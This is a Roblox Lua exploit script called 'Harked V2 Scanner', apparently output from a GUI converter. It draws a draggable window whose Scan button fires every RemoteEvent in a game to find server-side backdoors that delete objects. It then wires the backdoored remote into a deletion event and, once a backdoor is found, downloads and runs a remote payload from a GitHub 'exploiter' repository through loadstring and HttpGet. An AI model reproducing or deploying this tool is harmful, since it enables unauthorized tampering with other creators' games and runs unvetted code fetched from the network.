-- Instances: 8 | Scripts: 2 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.scan
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[scan]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.scan.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["2"]["Size"] = UDim2.new(0, 194, 0, 108);
G2L["2"]["Position"] = UDim2.new(0.42524, 0, 0.41194, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["BackgroundTransparency"] = 0.04;


-- StarterGui.scan.Frame.Drag
G2L["3"] = Instance.new("LocalScript", G2L["2"]);
G2L["3"]["Name"] = [[Drag]];


-- StarterGui.scan.Frame.TextLabel
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["TextWrapped"] = true;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["TextSize"] = 16;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["RichText"] = true;
G2L["4"]["Size"] = UDim2.new(0, 112, 0, 50);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Text"] = [[Harked V2 Scanner]];
G2L["4"]["Position"] = UDim2.new(0.22165, 0, 0, 0);


-- StarterGui.scan.Frame.TextButton
G2L["5"] = Instance.new("TextButton", G2L["2"]);
G2L["5"]["TextWrapped"] = true;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 14;
G2L["5"]["TextScaled"] = true;
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["BackgroundTransparency"] = 0.23;
G2L["5"]["Size"] = UDim2.new(0, 167, 0, 38);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Scan]];
G2L["5"]["Position"] = UDim2.new(0.07216, 0, 0.46296, 0);


-- StarterGui.scan.Frame.TextButton.LocalScript
G2L["6"] = Instance.new("LocalScript", G2L["5"]);



-- StarterGui.scan.Frame.TextButton.UICorner
G2L["7"] = Instance.new("UICorner", G2L["5"]);



-- StarterGui.scan.Frame.UICorner
G2L["8"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.scan.Frame.Drag
local function C_3()
local script = G2L["3"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
	
end;
task.spawn(C_3);
-- StarterGui.scan.Frame.TextButton.LocalScript
local function C_6()
local script = G2L["6"];
	local AlreadyScanned
	
	script.Parent.MouseButton1Click:Connect(function()
		if AlreadyScanned then return end
		AlreadyScanned = true
		local tbtext = script.Parent
		tbtext.Text = "Scanning"
		-- // credits for the STRAWBERRY team
		local timer = tick() -- // times how long it takes to load the script
		local backdoorfound = false; -- // this will turn to true or false depending on if vuln found
		local vulnremote = nil; -- // if a remote with a vuln or backdoor is found it will be referenced in this variable
		local mgui = script.Parent.Parent.Parent
		
		local safetime = 0.25; -- // lower will cause faster scan times but it will mess up more and have false positives
		-- // higher numbers (like 0.25 which is the default) will take longer but be a good scanner
		-- // 0.25 is the best for all situations and prob wont need to be changed
	
		
		local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
		deletebind.Name = "deletebind";
		deletebind.Event:Connect(function(item)
			if backdoorfound == true then
				vulnremote:FireServer(item);
			end;
		end); -- // creates a delete event with the backdoored remote so the gui can use it
	
		local function remoteBackdoored(remote)
			local function testfire(item)
				pcall(function()
					remote:FireServer(item);			
				end);
			end;
			local function isDestroyed(obj)
				return obj == nil or obj.Parent == nil;
			end;
			local testpart = game.Players.LocalPlayer:FindFirstChild("StarterGear") or game.Players.LocalPlayer.Character:FindFirstChild("Head");
			testfire(testpart);
			task.wait(safetime); -- // slight delay to see if remote reacts
			print("Harked V2: "..remote.Name.." /isbackdoored: "..tostring(isDestroyed(testpart)).." / "..remote:GetFullName());
			if isDestroyed(testpart) then
				vulnremote = remote;
				return true;
			end;
			return false;
		end; -- // checks a remote event for a backdoor or vulnerability by firing it and seeing if it does something
	
		local function scan()
			if backdoorfound then return end;
			for i, v in ipairs(game:GetDescendants()) do
				if v:IsA("RemoteEvent") then
					if not v.Parent then continue end;
					if v.Parent.Name == "RobloxReplicatedStorage" then continue end;
					if remoteBackdoored(v) == true then
						backdoorfound = true;
						print("Harked V2: found!");
						return; -- // backdoor found so breaks the loop
					else
						-- // keeps scanning if a backdoor isent found
					end; -- // tests remote for backdoor
				end;
			end;
		end; -- // scans a place for vulnerable remotes
	
		task.wait(2); -- // 2 sec delay before scanning to stop huge lag spike
		scan(); -- // scans the WHOLE game for vuln/backdoored remotes
		task.wait();
		if backdoorfound then
			-- // loads up the gui
			tbtext.Text = "Backdoor found.";
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/rayfielduiharked.lua"))();
			task.wait(5);
			mgui:Destroy();
		else
			tbtext.Text = "No backdoor found.";
			task.wait(10);
			mgui:Destroy();
		end;
	end)
end;
task.spawn(C_6);

return G2L["1"], require;